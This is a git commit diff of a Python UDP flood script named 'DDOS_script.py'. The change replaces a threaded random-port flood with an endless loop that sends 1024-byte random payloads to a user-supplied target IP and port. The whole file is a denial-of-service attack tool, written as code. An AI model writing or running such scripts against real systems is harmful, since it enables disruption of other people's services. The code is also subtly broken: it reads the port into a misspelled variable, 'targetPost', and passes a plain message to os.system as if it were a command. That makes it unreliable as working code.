227f184739c834550bd5a6387435ac9e960f5fa8
thanhnguyen210299 <58540404+thanhnguyen210299@users.noreply.github.com>
2021-04-01 17:39:07 -0700

    UDP_Flood - Socket

--- DDOS/DDOS_script.py
+++ DDOS/DDOS_script.py
@@ -7,28 +7,20 @@ import threading
 
 """ Create a datagram based server socket that uses IPv4 addressing scheme """
 datagramSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
+payload = random._urandom(1024);
 
-
-targetIP = raw_input("Enter IP address of Target: ");
-
+targetIP = input("Enter IP address of Target: ");
+targetPost = input("Enter port of Target: ");
 
 os.system("clear");
 os.system("DDOS Attack is Starting");
 
 packetIP = 0;
-threadLimit = 200;
 
-def DDos_Attack():
-	while True:
-		targetPort = random.randint(1, 65535);
-		datagramSocket.sendto(("Hello World!\n").encode('ascii'), (targetIP, targetPort));
+while True:
+        datagramSocket.sendto(payload, (targetIP, targetPort));
 
-		global packetIP;
-		packetIP = packetIP + 1;
-		print("Packet ", packetIP, " was sent throught port %s", targetPort);
-
-for i in range(0, threadLimit):
-	thread_load = threading.Thread(target = DDos_Attack);
-	thread_load.start();
+        packetIP = packetIP + 1;
+        print("Packet ", packetIP, " was sent throught port %s", targetPort);
 
 datagramSocket.close();
